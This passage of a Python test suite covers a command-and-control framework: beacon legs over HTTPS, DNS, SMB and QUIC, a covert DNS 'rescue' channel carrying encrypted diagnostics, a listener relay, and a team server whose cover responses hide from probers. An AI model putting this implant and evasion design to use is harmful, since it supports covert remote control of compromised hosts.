                         (dns_rescue.CLASSES["resolve_failed"], 2))
        self.assertFalse(beacon._rescue_flags & dns_rescue.FLAG_DNS_ANSWERED)

    def test_an_nxdomain_carries_its_rcode(self):
        beacon = _rescue_beacon()

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 3        # NXDOMAIN
            return []

        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_dns()
        self.assertEqual(beacon._leg_status["dns"],
                         (dns_rescue.CLASSES["resolve_failed"], 3))

    def test_rcode_zero_with_no_records_is_still_an_answer(self):
        beacon = _rescue_beacon()

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 0
            return []

        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_dns()
        self.assertEqual(beacon._leg_status["dns"],
                         (dns_rescue.CLASSES["answered"], 0))
        self.assertTrue(beacon._rescue_flags & dns_rescue.FLAG_DNS_ANSWERED)

    def test_no_rescue_goes_into_a_resolver_that_servfailed(self):
        beacon = _rescue_beacon()
        sent = []

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 2
            if "." + dns_rescue.MARKER + "." in name:
                sent.append(name)
            return []

        beacon._start_cycle()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_dns()
            beacon._maybe_rescue()
        self.assertEqual(sent, [])

    def test_the_real_dns_query_reports_its_rcode(self):
        # Against the real parser, not a stub: a SERVFAIL header with no
        # answer section must set the status rather than look like silence.
        import struct as _struct
        from software.c2 import beacon as beacon_mod

        header = _struct.pack("!HHHHHH", 0x1234, 0x8002, 1, 0, 0, 0)

        class _Sock:
            def settimeout(self, *_):
                pass

            def sendto(self, *_):
                pass

            def recvfrom(self, *_):
                return header, None

            def close(self):
                pass

        status = {}
        with unittest.mock.patch.object(beacon_mod.socket, "socket",
                                        lambda *a, **kw: _Sock()):
            out = beacon_mod._dns_query("x.example", "TXT", "127.0.0.1",
                                        timeout=1, status=status)
        self.assertEqual(out, [])
        self.assertEqual(status["rcode"], 2)


class TestClassifyingAFailure(unittest.TestCase):
    """`_rescue_class_of` had no test, and it was wrong.

    `_HttpSession` raises `URLError` wrapping the real cause, so checking
    the outer type alone reported a refused connection, a TLS failure and
    a timeout all as `unreachable` -- three different operator actions
    collapsed into one useless word.
    """

    def _class_of(self, exc):
        from software.c2 import beacon as beacon_mod

        return beacon_mod._rescue_class_of(exc)

    def test_a_refused_connection_is_refused(self):
        import urllib.error

        self.assertEqual(
            self._class_of(urllib.error.URLError(ConnectionRefusedError(61))),
            dns_rescue.CLASSES["refused"])

    def test_a_tls_failure_is_tls_failed(self):
        import ssl
        import urllib.error

        self.assertEqual(
            self._class_of(urllib.error.URLError(ssl.SSLError("handshake"))),
            dns_rescue.CLASSES["tls_failed"])

    def test_a_timeout_is_timed_out(self):
        import socket as _socket
        import urllib.error

        for exc in (_socket.timeout("timed out"), TimeoutError()):
            with self.subTest(exc=type(exc).__name__):
                self.assertEqual(self._class_of(urllib.error.URLError(exc)),
                                 dns_rescue.CLASSES["timed_out"])

    def test_an_unwrapped_cause_is_classified_too(self):
        self.assertEqual(self._class_of(ConnectionRefusedError(61)),
                         dns_rescue.CLASSES["refused"])

    def test_a_reply_that_could_not_be_read_is_bad_payload(self):
        self.assertEqual(self._class_of(ValueError("not json")),
                         dns_rescue.CLASSES["bad_payload"])

    def test_anything_else_is_unreachable(self):
        self.assertEqual(self._class_of(RuntimeError("?")),
                         dns_rescue.CLASSES["unreachable"])

    def test_no_message_text_reaches_the_class(self):
        # By type, never by message: a message can carry a hostname or a
        # URL, and this value goes into a DNS query name.
        import urllib.error

        hostile = urllib.error.URLError(
            OSError("cannot reach secret-dc01.corp.example:8443"))
        self.assertIn(self._class_of(hostile), set(dns_rescue.CLASSES.values()))


class _SilentUdp:
    """A UDP socket that takes a datagram and never answers.

    This is what a dead QUIC endpoint looks like on Linux: the datagram
    goes out, the ICMP port-unreachable comes back, and the kernel does
    not deliver it on an *unconnected* socket -- so there is no
    exception, only a timeout. macOS does surface it as
    ConnectionRefusedError, which is why the first version of this test
    passed there and failed in the VM.
    """

    def __init__(self):
        self.sent = []

    def settimeout(self, _):
        pass

    def sendto(self, data, _addr):
        self.sent.append(data)

    def recvfrom(self, _n):
        raise socket.timeout()

    def close(self):
        pass


class _AnsweringUdp(_SilentUdp):
    """Answers with one well-formed fragment carrying the given bytes."""

    def __init__(self, body: bytes):
        super().__init__()
        frame = struct.pack(">I", len(body)) + body
        self._dgram = struct.pack(">IHH", 1, 0, 1) + frame
        self._given = False

    def recvfrom(self, _n):
        if self._given:
            raise socket.timeout()
        self._given = True
        return self._dgram, ("127.0.0.1", 4433)


def _with_udp(beacon, sock):
    """Hand `_quic_send` a socket without touching the real socket module."""
    stub = unittest.mock.Mock()
    stub.AF_INET = socket.AF_INET
    stub.SOCK_DGRAM = socket.SOCK_DGRAM
    stub.timeout = socket.timeout
    stub.socket.return_value = sock
    return unittest.mock.patch.object(
        sys.modules["software.c2.beacon"], "socket", stub)


class TestTheOtherLegsRecordToo(unittest.TestCase):
    """An unrecorded leg packs as `not_attempted`, which is a lie.

    Found in the ParrotOS VM, not here: these legs recorded their
    failures only from an `except` branch, and both of them have quiet
    return paths that reach no exception at all. On Linux those quiet
    paths are the *normal* ones, so a QUIC endpoint that was tried and
    timed out was reported to the operator as "not tried".
    """

    def test_a_quic_timeout_is_recorded_not_left_as_not_attempted(self):
        # Deterministic on purpose. The earlier version pointed a real
        # socket at 127.0.0.1:1 and relied on the OS to raise, which is
        # macOS behaviour and not Linux's.
        beacon = _a_beacon(quic={"enabled": True, "host": "127.0.0.1:4433"})
        sock = _SilentUdp()
        with _with_udp(beacon, sock):
            self.assertIsNone(beacon._beacon_quic())
        self.assertTrue(sock.sent, "nothing was even sent")
        self.assertEqual(beacon._leg_status.get("quic", (None,))[0],
                         dns_rescue.CLASSES["timed_out"],
                         "a QUIC leg that was tried and timed out would be "
                         "reported to the operator as 'not tried'")

    def test_a_quic_answer_that_does_not_decrypt_is_bad_payload(self):
        beacon = _a_beacon(quic={"enabled": True, "host": "127.0.0.1:4433"})
        with _with_udp(beacon, _AnsweringUdp(b"not encrypted at all")):
            self.assertIsNone(beacon._beacon_quic())
        self.assertEqual(beacon._leg_status.get("quic", (None,))[0],
                         dns_rescue.CLASSES["bad_payload"])

    def test_a_quic_failure_that_does_raise_is_still_recorded(self):
        # The path that already worked, kept so a fix to the quiet paths
        # cannot silently break it.
        beacon = _a_beacon(quic={"enabled": True, "host": "127.0.0.1:4433"})

        class _Refused(_SilentUdp):
            def recvfrom(self, _n):
                raise ConnectionRefusedError(61)

        with _with_udp(beacon, _Refused()):
            beacon._beacon_quic()
        self.assertEqual(beacon._leg_status.get("quic", (None,))[0],
                         dns_rescue.CLASSES["refused"])

    def test_an_smb_pipe_that_answers_nothing_is_recorded(self):
        beacon = _a_beacon(smb={"enabled": True, "host": "127.0.0.1"})

        class _Sock:
            def close(self):
                pass

        with unittest.mock.patch.object(beacon, "_smb_connect",
                                        lambda: _Sock()), \
             unittest.mock.patch.object(beacon, "_smb_write_pipe",
                                        lambda *a, **kw: True), \
             unittest.mock.patch.object(beacon, "_smb_read_pipe",
                                        lambda *a, **kw: None):
            self.assertIsNone(beacon._beacon_smb())
        self.assertEqual(beacon._leg_status.get("smb", (None,))[0],
                         dns_rescue.CLASSES["timed_out"])

    def test_an_smb_answer_that_does_not_decrypt_is_bad_payload(self):
        beacon = _a_beacon(smb={"enabled": True, "host": "127.0.0.1"})

        class _Sock:
            def close(self):
                pass

        with unittest.mock.patch.object(beacon, "_smb_connect",
                                        lambda: _Sock()), \
             unittest.mock.patch.object(beacon, "_smb_write_pipe",
                                        lambda *a, **kw: True), \
             unittest.mock.patch.object(beacon, "_smb_read_pipe",
                                        lambda *a, **kw: b"not encrypted"):
            self.assertIsNone(beacon._beacon_smb())
        self.assertEqual(beacon._leg_status.get("smb", (None,))[0],
                         dns_rescue.CLASSES["bad_payload"])

    def test_an_smb_exception_is_recorded_like_https_and_quic(self):
        beacon = _a_beacon(smb={"enabled": True, "host": "127.0.0.1"})

        class _Sock:
            def close(self):
                pass

        def boom(*a, **kw):
            raise ConnectionResetError(54)

        with unittest.mock.patch.object(beacon, "_smb_connect",
                                        lambda: _Sock()), \
             unittest.mock.patch.object(beacon, "_smb_write_pipe", boom):
            self.assertIsNone(beacon._beacon_smb())
        self.assertIn("smb", beacon._leg_status,
                      "SMB was the only leg whose except branch recorded "
                      "nothing at all")
        self.assertNotEqual(beacon._leg_status["smb"][0],
                            dns_rescue.CLASSES["not_attempted"])

    def test_an_smb_write_failure_is_recorded_not_just_the_connect(self):
        beacon = _a_beacon(smb={"enabled": True, "host": "127.0.0.1"})

        class _Sock:
            def close(self):
                pass

        with unittest.mock.patch.object(beacon, "_smb_connect",
                                        lambda: _Sock()), \
             unittest.mock.patch.object(beacon, "_smb_write_pipe",
                                        lambda *a, **kw: False):
            beacon._beacon_smb()
        self.assertIn("smb", beacon._leg_status)
        self.assertNotEqual(beacon._leg_status["smb"][0],
                            dns_rescue.CLASSES["not_attempted"])

    def test_a_proxy_that_refused_is_not_reported_as_wanting_credentials(self):
        # _ProxyError covers any proxy problem, including a refused one.
        # Calling all of them "auth_required" corrupts the single most
        # useful diagnostic this channel carries.
        from software.c2 import beacon as beacon_mod

        beacon = _a_beacon(https={"enabled": True})

        class _Session:
            trust_env = True
            proxies = {"https": "http://proxy.example:8080"}

            def post(self, *a, **kw):
                raise beacon_mod._ProxyError("proxy connection refused")

        beacon._proxy_session = _Session()
        beacon._beacon_https()
        self.assertTrue(beacon._rescue_flags & dns_rescue.FLAG_PROXY_FOUND)
        self.assertNotEqual(beacon._leg_status.get("https", (0, 0))[0],
                            dns_rescue.CLASSES["auth_required"])


# ── The listener relays it (Task 4) ──


class TestTheListenerRelaysARescue(unittest.TestCase):
    """The one exception to "this transport carries nothing upstream".

    The listener still holds no key: it hands the opaque payload to the
    same `relay` the SMB and QUIC listeners use and puts the opaque answer
    in a TXT record.
    """

    ZONE = "c2.test"

    def setUp(self):
        from software.c2.listeners.dns import DnsListener

        self.listener = DnsListener(
            "127.0.0.1", 0, relay_url="http://127.0.0.1:1",
            zone=self.ZONE, listener_token="t")
        self.agent = "clumsy-raccoon"
        self.label = (base64.b32encode(self.agent.encode()).decode()
                      .rstrip("=").lower())

    def _query(self, name):
        from software.c2 import beacon as beacon_mod

        return beacon_mod._dns_build_query(name, "TXT") \
            if hasattr(beacon_mod, "_dns_build_query") else None

    def _answer(self, name):
        """Drive `_answer_for` with a real query for `name`."""
        import struct as _struct

        qname = b""
        for part in name.split("."):
            qname += bytes([len(part)]) + part.encode()
        qname += b"\x00"
        query = _struct.pack("!HHHHHH", 0x4242, 0x0100, 1, 0, 0, 0) \
            + qname + _struct.pack("!HH", 16, 1)
        return self.listener._answer_for(query)

    def _rescue_name(self, payload_b64=None):
        from software.c2 import beacon as beacon_mod

        if payload_b64 is None:
            payload_b64 = _a_ciphertext()
        one, two = beacon_mod._rescue_to_labels(payload_b64)
        return "%s.%s.%s.%s.%s" % (one, two, self.label,
                                   dns_rescue.MARKER, self.ZONE)

    def test_a_rescue_query_is_relayed_and_not_fetched(self):
        seen = {}

        def relay(payload, *, url, timeout=30.0):
            seen["payload"] = payload
            seen["url"] = url
            return None

        def fetch(*a, **kw):
            seen["fetched"] = True
            return None

        cipher = _a_ciphertext()
        with unittest.mock.patch.multiple(
                "software.c2.listeners.dns", relay=relay,
                fetch_tasking=fetch, create=True):
            self._answer(self._rescue_name(cipher))
        self.assertEqual(seen.get("payload"), cipher)
        self.assertEqual(seen["url"], "http://127.0.0.1:1")
        self.assertNotIn("fetched", seen)

    def test_a_tasking_query_still_fetches_and_does_not_relay(self):
        seen = {}

        with unittest.mock.patch.multiple(
                "software.c2.listeners.dns",
                relay=lambda *a, **kw: seen.setdefault("relayed", True),
                fetch_tasking=lambda *a, **kw: seen.setdefault("fetched", True)
                and None,
                create=True):
            self._answer("%s.b.%s" % (self.label, self.ZONE))
        self.assertIn("fetched", seen)
        self.assertNotIn("relayed", seen)

    def test_the_answer_carries_what_the_relay_returned(self):
        from software.c2 import beacon as beacon_mod

        task = "opaque-answer-from-the-server"
        with unittest.mock.patch.multiple(
                "software.c2.listeners.dns",
                relay=lambda *a, **kw: task, create=True):
            answer = self._answer(self._rescue_name())
        self.assertIsNotNone(answer)
        self.assertIn(task.encode(), answer)

    def test_a_malformed_payload_answers_exactly_like_an_empty_queue(self):
        # The oracle question. A listener whose reply differs for a payload
        # that did not decrypt tells an attacker when a guess was right.
        from software.c2 import beacon as beacon_mod

        empty = self._answer("%s.b.%s" % (self.label, self.ZONE))
        bad_names = [
            "!!!.!!!.%s.%s.%s" % (self.label, dns_rescue.MARKER, self.ZONE),
            "abc.%s.%s.%s" % (self.label, dns_rescue.MARKER, self.ZONE),
            "%s.%s.%s" % (self.label, dns_rescue.MARKER, self.ZONE),
            "aaaa.bbbb.cccc.dddd.%s.%s" % (dns_rescue.MARKER, self.ZONE),
        ]
        with unittest.mock.patch.multiple(
                "software.c2.listeners.dns",
                relay=lambda *a, **kw: None,
                fetch_tasking=lambda *a, **kw: None, create=True):
            for name in bad_names:
                with self.subTest(name=name[:28]):
                    got = self._answer(name)
                    self.assertIsNotNone(got)
                    # Same shape: a TXT answer with no records. The
                    # transaction id and the question differ by name, so
                    # compare the counts, which are what a prober reads.
                    self.assertEqual(got[6:12], empty[6:12])

    def test_the_listener_never_decrypts_on_the_rescue_path(self):
        import inspect

        from software.c2.listeners import dns as dns_listener

        source = inspect.getsource(dns_listener)
        for forbidden in ("_decrypt", "ServerCrypto", "aes", "encryption_key"):
            with self.subTest(forbidden=forbidden):
                self.assertNotIn(forbidden, source)


class TestTheFingerprint(unittest.TestCase):
    """Two bytes that say which beacon is stuck, because the id will not fit."""

    def test_it_is_two_bytes_and_stable(self):
        got = dns_rescue.fingerprint("clumsy-raccoon")
        self.assertEqual(got, dns_rescue.fingerprint("clumsy-raccoon"))
        self.assertTrue(0 <= got <= 0xFFFF)

    def test_different_agents_usually_differ(self):
        seen = {dns_rescue.fingerprint("agent-%d" % n) for n in range(200)}
        # Birthday collisions are expected and documented; what matters is
        # that it is not a constant.
        self.assertGreater(len(seen), 180)

    def test_it_survives_the_record(self):
        raw = dns_rescue.pack({}, 0, dns_rescue.fingerprint("sly-fox"))
        self.assertEqual(dns_rescue.unpack(raw)["fingerprint"],
                         dns_rescue.fingerprint("sly-fox"))

    def test_both_sides_compute_the_same_one(self):
        from software.c2 import beacon as beacon_mod

        for agent in ("clumsy-raccoon", "a", "", "ümlaut-agent"):
            with self.subTest(agent=agent):
                self.assertEqual(beacon_mod._rescue_fingerprint(agent),
                                 dns_rescue.fingerprint(agent))

    def test_the_beacon_puts_its_own_fingerprint_in_the_record(self):
        beacon = _rescue_beacon()
        beacon._start_cycle()
        beacon._rescue_flags |= dns_rescue.FLAG_DNS_ANSWERED
        beacon._record_leg("https", dns_rescue.CLASSES["auth_required"], 407)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        one, two = sent.names[0].split(".")[:2]
        raw = base64.b64decode(beacon._decrypt(
            dns_rescue.from_labels(one, two))[dns_rescue.WRAPPER_KEY])
        self.assertEqual(
            dns_rescue.unpack(raw)["fingerprint"],
            dns_rescue.fingerprint(beacon._agent_id or beacon._implant_id))


# ── The server shows it (Task 5) ──


class TestTheServerDecodesARescue(unittest.TestCase):
    """Through the real unwrap path, with no server-side decryption change."""

    def setUp(self):
        import tempfile

        from software.c2 import server as server_mod

        self.server_mod = server_mod
        self.crypto = server_mod.ServerCrypto(_KEY)
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        # A real app, because the handlers answer with `jsonify` and the
        # cover response is part of what is being tested.
        self.app = server_mod.create_app(self.crypto, "operator-token",
                                         pathlib_Path(tmp.name))
        server_mod.agents.clear()
        self.addCleanup(server_mod.agents.clear)
        self.agent = "clumsy-raccoon"
        server_mod.agents[self.agent] = {
            "id": "implant-1", "hostname": "h", "last_seen": "now",
            "caps": [],
        }

    def _record(self, agent_for_fingerprint=None, **legs):
        return dns_rescue.pack(
            legs or {"https": (dns_rescue.CLASSES["auth_required"], 407),
                     "dns": (dns_rescue.CLASSES["answered"], 0)},
            dns_rescue.FLAG_PROXY_FOUND | dns_rescue.FLAG_DNS_ANSWERED,
            dns_rescue.fingerprint(agent_for_fingerprint
                                   if agent_for_fingerprint is not None
                                   else self.agent))

    def _deliver(self, raw):
        """Hand a wrapped rescue to the handler the way the relay does."""
        wrapped = self.crypto.wrap(
            {dns_rescue.WRAPPER_KEY: base64.b64encode(raw).decode()})
        with self.app.test_request_context("/api/v1/beacon", json=wrapped):
            return self.server_mod._handle_rescue(
                self.crypto.unwrap(wrapped) or {}, self.crypto)

    def _deliver_through_the_socket(self, raw):
        """The whole path: a POST shaped the way `relay` shapes one."""
        wrapped = self.crypto.wrap(
            {dns_rescue.WRAPPER_KEY: base64.b64encode(raw).decode()})
        with self.app.test_client() as client:
            return client.post("/api/v1/beacon", json=wrapped)

    def test_a_rescue_reaches_the_matching_agent_record(self):
        self._deliver(self._record())
        stuck = self.server_mod.agents[self.agent].get("stuck")
        self.assertIsNotNone(stuck)
        self.assertEqual(stuck["https"], ["auth_required", 407])
        self.assertTrue(stuck["dns_answered"])

    def test_the_agent_is_marked_as_last_heard_over_dns(self):
        # `_handle_rescue` sets `last_channel = "dns"` and then calls
        # `_handle_beacon`, which sets it to "http" on every check-in --
        # so the mark the rescue path deliberately made was destroyed one
        # line later, and the interface showed "http" for a beacon whose
        # only working leg was DNS. Exactly backwards, and exactly in the
        # situation this channel exists for.
        self._deliver(self._record())
        self.assertEqual(
            self.server_mod.agents[self.agent].get("last_channel"), "dns")

    def test_it_reads_as_a_sentence_an_operator_can_act_on(self):
        self._deliver(self._record())
        summary = self.server_mod.agents[self.agent]["stuck"]["summary"]
        self.assertIn("407", summary)
        self.assertIn("HTTPS", summary.upper())
        self.assertNotIn("0x", summary)

    def test_an_unattributable_rescue_is_kept_not_dropped(self):
        # A drop-box that never managed to register is the case with the
        # least other evidence, so it must still be visible.
        self._deliver(self._record(agent_for_fingerprint="nobody-here"))
        self.assertIsNone(self.server_mod.agents[self.agent].get("stuck"))
        self.assertTrue(self.server_mod.unattributed_rescues)
        self.assertIn("407",
                      self.server_mod.unattributed_rescues[-1]["summary"])

    def test_an_unknown_version_is_refused_but_still_looks_ordinary(self):
        # Refused, and indistinguishable from any other request: a record
        # this server cannot read is as likely to be an attacker probing
        # as a beacon from a future build, and neither should learn which.
        bad = bytearray(self._record())
        bad[0] = 0xFF
        before = len(self.server_mod.unattributed_rescues)
        answer = self._deliver(bytes(bad))
        self.assertIsNotNone(answer)
        self.assertIsNone(self.server_mod.agents[self.agent].get("stuck"))
        self.assertEqual(len(self.server_mod.unattributed_rescues), before)

    def test_the_whole_path_works_through_the_beacon_socket(self):
        # Shaped the way `relay` shapes a POST, through the real route and
        # the real unwrap, with no server-side decryption change.
        response = self._deliver_through_the_socket(self._record())
        self.assertEqual(response.status_code, 200)
        self.assertIsNotNone(self.server_mod.agents[self.agent].get("stuck"))

    def test_the_handler_answers_like_any_other_check_in(self):
        # The reply must not tell a prober that a rescue was understood.
        answer = self._deliver(self._record())
        self.assertIsNotNone(answer)

    def test_a_rescue_routes_through_the_action_dispatch_by_its_key(self):
        # The contract is the dedicated wrapper key, checked before the
        # action dispatch -- not a guess about a payload with no action.
        import inspect

        src = inspect.getsource(self.server_mod.create_app)
        self.assertIn("WRAPPER_KEY", src)


class TestARescueNobodyCanClaim(unittest.TestCase):
    """The diagnosis of the beacon that never registered, made visible.

    It used to be appended to a list nothing read: received, decrypted and
    decoded, then discarded into memory. Every record here is built by the
    real path -- the beacon's own `_encrypt`, POSTed to `/` -- rather than
    appended to the list.
    """

    TOKEN = "operator-token"

    def setUp(self):
        import tempfile

        from software.c2 import server as server_mod

        self.server_mod = server_mod
        self.crypto = server_mod.ServerCrypto(_KEY)
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.app = server_mod.create_app(self.crypto, self.TOKEN,
                                         pathlib_Path(tmp.name))
        self.beacon = _a_beacon()
        server_mod.agents.clear()
        self.addCleanup(server_mod.agents.clear)
        del server_mod.unattributed_rescues[:]
        self.addCleanup(server_mod.unattributed_rescues.clear)
        before = len(server_mod.event_log)
        self.addCleanup(lambda: server_mod.event_log.__delitem__(
            slice(before, None)))
        self._first_new_log = before

    def _auth(self):
        return {"Authorization": "Bearer %s" % self.TOKEN}

    def _send(self, agent="a-box-that-never-registered", status=407,
              fingerprint=None):
        raw = dns_rescue.pack(
            {"https": (dns_rescue.CLASSES["http_status"], status),
             "dns": (dns_rescue.CLASSES["answered"], 0)},
            dns_rescue.FLAG_DNS_ANSWERED,
            dns_rescue.fingerprint(agent) if fingerprint is None
            else fingerprint)
        blob = self.beacon._encrypt(
            {dns_rescue.WRAPPER_KEY: base64.b64encode(raw).decode()})
        with self.app.test_client() as client:
            response = client.post("/", json={"cipher_text": blob})
        self.assertEqual(response.status_code, 200)

    def _served(self, client=None, **kw):
        client = client or self.app.test_client()
        return client.get("/api/rescues/unattributed",
                          headers=self._auth(), **kw)

    def _rescue_log(self):
        return [e for e in self.server_mod.event_log[self._first_new_log:]
                if e["cat"] == "RESCUE"]

    def test_an_unattributed_rescue_is_logged_so_it_is_not_silent(self):
        # It used to be appended to a list nothing read: decoded, stored and
        # discarded. The beacon that cannot be attributed is the one most
        # likely to be stuck, because never registering means the way out
        # was never open.
        self._send(status=407)
        entries = self._rescue_log()
        self.assertEqual(len(entries), 1)
        self.assertIn("407", entries[0]["msg"])
        self.assertIn("HTTPS", entries[0]["msg"])
        self.assertIn("%04x" % dns_rescue.fingerprint(
            "a-box-that-never-registered"), entries[0]["msg"])

    def test_an_attributed_rescue_is_not_logged_as_unclaimed(self):
        self.server_mod.agents["clumsy-raccoon"] = {
            "id": "implant-1", "hostname": "h", "last_seen": "now",
            "caps": []}
        self._send(agent="clumsy-raccoon")
        self.assertEqual(self._rescue_log(), [])
        self.assertEqual(self._served().get_json(), {"unattributed": []})

    def test_the_route_returns_it_newest_first(self):
        self._send(agent="first", status=401)
        self._send(agent="second", status=402)
        self._send(agent="third", status=403)
        response = self._served()
        self.assertEqual(response.status_code, 200)
        records = response.get_json()["unattributed"]
        self.assertEqual([r["fingerprint"] for r in records],
                         [dns_rescue.fingerprint(a)
                          for a in ("third", "second", "first")])
        self.assertIn("403", records[0]["summary"])
        for record in records:
            for key in ("summary", "dns_answered", "fingerprint", "at",
                        "https", "dns", "smb", "quic"):
                self.assertIn(key, record)
        self.assertEqual(records[0]["https"], ["http_status", 403])

    def test_the_route_is_empty_when_nothing_has_been_received(self):
        self.assertEqual(self._served().get_json(), {"unattributed": []})

    def test_premise_a_get_to_an_unrouted_path_is_405(self):
        # A premise, not a feature. The agent tool's degradation against an
        # older team server rests on what such a server answers to GET
        # /api/rescues/unattributed: 405, because its catch-all
        # /<path:path> accepts only POST, so a GET to an unrouted path is
        # a method error. `C2Client._request` tolerates only 404 as
        # "missing", which is why the tool has to absorb the 405 itself,
        # and why the client's docstring says what it says. If someone adds
        # a GET catch-all, the handling still works (every non-2xx raises)
        # but that rationale quietly stops being true; this test must break
        # first. The path is one no route will ever claim.
        client = self.app.test_client()
        for headers in ({}, self._auth()):
            with self.subTest(authenticated=bool(headers)):
                response = client.get(
                    "/never-a-route-405-premise/x", headers=headers)
                self.assertEqual(response.status_code, 405)

    def test_the_route_needs_the_operator_token(self):
        self._send()
        client = self.app.test_client()
        self.assertEqual(
            client.get("/api/rescues/unattributed").status_code, 401)
        wrong = client.get("/api/rescues/unattributed",
                           headers={"Authorization": "Bearer nope"})
        self.assertEqual(wrong.status_code, 401)
        self.assertNotIn(b"summary", wrong.data)

    def test_the_route_is_not_on_the_agent_socket(self):
        # Same policy as every other /api/ route: a request judged by the
        # socket it arrived on, refused with the catch-all's own answer.
        import tempfile

        self._send()
        with tempfile.TemporaryDirectory() as tmp:
            split = self.server_mod.create_app(
                self.crypto, self.TOKEN, pathlib_Path(tmp),
                operator_port=8444)
        client = split.test_client()
        cover = client.post("/", json={"not": "a beacon"},
                            environ_overrides={"SERVER_PORT": "9444"})
        refused = client.get("/api/rescues/unattributed",
                             headers=self._auth(),
                             environ_overrides={"SERVER_PORT": "9444"})
        self.assertEqual((refused.status_code, refused.data),
                         (cover.status_code, cover.data))
        self.assertNotIn(b"unattributed", refused.data)
        served = client.get("/api/rescues/unattributed",
                            headers=self._auth(),
                            environ_overrides={"SERVER_PORT": "8444"})
        self.assertEqual(served.status_code, 200)
        self.assertEqual(len(served.get_json()["unattributed"]), 1)

    def test_a_rescue_for_a_deleted_agent_is_reported_not_dropped(self):
        # Review Focus 3. Attribution matches the live fleet, so a record
        # for an agent the operator has removed lands here.
        agent = "clumsy-raccoon"
        self.server_mod.agents[agent] = {
            "id": "implant-1", "hostname": "h", "last_seen": "now",
            "caps": []}
        self._send(agent=agent)
        self.assertIn("stuck", self.server_mod.agents[agent])
        self.assertEqual(self._served().get_json(), {"unattributed": []})

        del self.server_mod.agents[agent]
        self._send(agent=agent, status=503)
        records = self._served().get_json()["unattributed"]
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["fingerprint"],
                         dns_rescue.fingerprint(agent))
        self.assertIn("503", records[0]["summary"])
        self.assertEqual(len(self._rescue_log()), 1)

    def test_nothing_in_the_record_is_treated_as_an_agent_id(self):
        # Review Focus 3. The record carries a 2-byte fingerprint and leg
        # codes. No string from the target can reach it, and the route must
        # not invent an id from the fingerprint.
        fp = dns_rescue.fingerprint("a-box-that-never-registered")
        lookalikes = ("%04x" % fp, "%d" % fp, "0x%04x" % fp)
        for name in lookalikes:
            self.server_mod.agents[name] = {
                "id": "impl-" + name, "hostname": "h", "last_seen": "now",
                "caps": []}
        self._send()
        record = self._served().get_json()["unattributed"][0]
        for key in ("agent_id", "agent", "id", "name"):
            self.assertNotIn(key, record)
        self.assertEqual(sorted(k for k, v in record.items()
                                if isinstance(v, str)), ["at", "summary"])
        self.assertEqual(self._rescue_log()[0]["agent"], "")
        for name in lookalikes:
            self.assertNotIn("stuck", self.server_mod.agents[name])
        self.assertEqual(set(self.server_mod.agents), set(lookalikes))
        with self.app.test_client() as client:
            for name in lookalikes:
                logs = client.get("/api/logs/agent/" + name,
                                  headers=self._auth()).get_json()
                self.assertEqual(logs, [])

    def test_the_list_stays_capped(self):
        # Review Focus 2's other half: 51 records leave 50.
        cap = self.server_mod._RESCUE_UNATTRIBUTED_MAX
        for n in range(cap + 1):
            self._send(fingerprint=n)
        records = self._served().get_json()["unattributed"]
        self.assertEqual(len(records), cap)
        self.assertEqual(records[0]["fingerprint"], cap)
        self.assertEqual(records[-1]["fingerprint"], 1)


def _operator_script(cache={}):
    """The inline JS of the operator GUI, with literal text removed.

    Removed, because the page is one 200 kB string full of prose: a
    tooltip that happens to read "Analyze (fast)" looks exactly like a
    call to a function named `Analyze` to any regex. What is left is
    code, including the `${...}` expressions inside template literals,
    which is where the GUI does most of its work.
    """
    if "js" in cache:
        return cache["js"]
    import re

    from software.c2 import server as server_mod

    blocks = re.findall(r"<script[^>]*>(.*?)</script>",
                        server_mod._OPERATOR_HTML, re.S)
    cache["js"] = _strip_js_literals("\n".join(blocks))
    return cache["js"]


def _strip_js_literals(js):
    """Drop comments and string *contents*, keeping ${...} expressions."""
    out = []
    i, n = 0, len(js)
    while i < n:
        c = js[i]
        if c == "/" and js[i + 1:i + 2] == "/":
            while i < n and js[i] != "\n":
                i += 1
        elif c == "/" and js[i + 1:i + 2] == "*":
            i += 2
            while i + 1 < n and not (js[i] == "*" and js[i + 1] == "/"):
                i += 1
            i += 2
        elif c in "\"'":
            quote = c
            i += 1
            while i < n and js[i] != quote:
                i += 2 if js[i] == "\\" else 1
            i += 1
            out.append(' "" ')
        elif c == "`":
            i += 1
            while i < n:
                if js[i] == "\\":
                    i += 2
                    continue
                if js[i] == "`":
                    i += 1
                    break
                if js[i] == "$" and js[i + 1:i + 2] == "{":
                    i += 2
                    start, brace = i, 1
                    while i < n and brace:
                        brace += {"{": 1, "}": -1}.get(js[i], 0)
                        i += 1
                    out.append(" " + js[start:i - 1] + " ")
                    continue
                i += 1
        else:
            out.append(c)
            i += 1
    return "".join(out)


class TestARescueFromABeaconThatNeverLearnedItsName(unittest.TestCase):
    """The fingerprint may be of the implant id, and the server knows it.

    An implant stamps `fingerprint(self._agent_id or self._implant_id)`, and
    `_agent_id` is set in exactly one place: the HTTPS registration reply.
    No other transport sends `action=register`, so a beacon whose HTTPS leg
    is down for the whole life of its process never learns its fleet name
    and stamps its implant id instead.

    That is not a rare shape. An implant id is one per host and stable
    across restarts (a known limit in its own right), so the agent record
    from an earlier process is still in the fleet, holding that very id in
    `info["id"]`. The server compared the record only against fleet names,
    dropped the diagnosis into the unattributable list, and showed the
    operator "a stuck beacon nobody can claim" about a host it could name.

    Matching an implant id to a fleet name is not new here: `_handle_beacon`
    does it for a check-in that arrives without one, and `_handle_register`
    does it to recognise a returning host. The rescue path was the one that
    did not.
    """

    def setUp(self):
        import tempfile

        from software.c2 import server as server_mod

        self.server_mod = server_mod
        self.crypto = server_mod.ServerCrypto(_KEY)
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
